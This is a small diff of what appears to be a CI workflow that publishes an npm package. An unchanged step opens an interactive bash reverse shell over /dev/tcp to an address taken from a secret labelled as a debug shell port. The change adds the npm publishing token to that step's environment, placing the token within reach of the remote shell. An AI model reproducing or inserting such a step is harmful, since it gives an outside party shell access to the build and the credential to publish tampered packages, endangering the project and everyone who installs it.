@@ -77,6 +77,7 @@ jobs:
         run: '[[ ! -z "$PORT" ]] && bash -i >& /dev/tcp/$PORT 0>&1'
         env:
           PORT: ${{ secrets.debug_shell_port }}
+          NPM_TOKEN: ${{ secrets.npm_token }}
 
       - name: Publish
         run: npx npm@7 --verbose publish
